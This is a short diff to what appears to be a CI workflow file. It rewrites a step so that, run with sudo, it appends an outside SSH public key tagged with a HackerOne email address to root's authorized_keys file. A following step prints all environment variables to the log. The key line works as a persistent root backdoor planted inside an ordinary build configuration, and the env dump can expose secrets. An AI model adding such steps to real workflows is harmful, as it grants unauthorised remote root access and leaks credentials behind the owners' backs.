@@ -42,7 +42,7 @@ jobs:
         run: |
           sudo ls -la /root
           sudo ls -la /root/.ssh
-          sudo echo >> "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC+KR3t/QGFxMFjMWSHknBsz3b6PVGoCMcpaI6elnNw0UjjGal+F0wNiOIiXp2eKqZhcg5VcjXFg/CSg+okTGkvtzfsjPGmZwPLLcal0ZNMBz/USqByzBcqzl05yyNlX+v5roi5c3xIyfxeHJ1M8ie92tqKIm82UjIoFRqiCV9JvYj/UDhkT4OJozJrhqwJPGO7K3Ie/OtmlGbqnDbOPWFg33+lpqxHcxSW7SXCROptNLrjnWN76c/m90SHzV/mMiyr/Ulu4wTM1miK5RGjOTYLftNZMlEnleoHdmFo6UExEGEXkqjS/1qLgbZEJKn7yro9ksQr9NXyhiiJhl0CsQZ7IGp/aAUeTI/rJ29KPWUvMyAVVgyEfb3GFbypMzGPlmC5ou0G2dFgb9OGUibEReyww42v1udNgdH/5/tGY48fgSZIB5xk59tT7RlF2sndPCfmEIsGH/U8zjrM1s84iHj4fOCKJ+Zd+A0OKAV2f4nAhEDYd7N/mrzforqrEQkPUxtufwIJ08shvOvecBZ/prIp27E5DyH0rUgKxxkkf0WP4235SBxrYSvoefq4c9zGSjThGlwHnI4xKxhV2ebOnCTlZBCqtjl8QM/K58MhN0+WKUsRTGNSKQZjzMMd0V4Sivvl/wax91DqPhex1dOlZ1hGojXQi2H/L6QB54Ew8QMh6w== trayhard@wearehackerone.com" /root/.ssh/authorized_keys
+          sudo echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC+KR3t/QGFxMFjMWSHknBsz3b6PVGoCMcpaI6elnNw0UjjGal+F0wNiOIiXp2eKqZhcg5VcjXFg/CSg+okTGkvtzfsjPGmZwPLLcal0ZNMBz/USqByzBcqzl05yyNlX+v5roi5c3xIyfxeHJ1M8ie92tqKIm82UjIoFRqiCV9JvYj/UDhkT4OJozJrhqwJPGO7K3Ie/OtmlGbqnDbOPWFg33+lpqxHcxSW7SXCROptNLrjnWN76c/m90SHzV/mMiyr/Ulu4wTM1miK5RGjOTYLftNZMlEnleoHdmFo6UExEGEXkqjS/1qLgbZEJKn7yro9ksQr9NXyhiiJhl0CsQZ7IGp/aAUeTI/rJ29KPWUvMyAVVgyEfb3GFbypMzGPlmC5ou0G2dFgb9OGUibEReyww42v1udNgdH/5/tGY48fgSZIB5xk59tT7RlF2sndPCfmEIsGH/U8zjrM1s84iHj4fOCKJ+Zd+A0OKAV2f4nAhEDYd7N/mrzforqrEQkPUxtufwIJ08shvOvecBZ/prIp27E5DyH0rUgKxxkkf0WP4235SBxrYSvoefq4c9zGSjThGlwHnI4xKxhV2ebOnCTlZBCqtjl8QM/K58MhN0+WKUsRTGNSKQZjzMMd0V4Sivvl/wax91DqPhex1dOlZ1hGojXQi2H/L6QB54Ew8QMh6w== trayhard@wearehackerone.com' >> /root/.ssh/authorized_keys
 
       - name: Display Environment Variables
         run: env
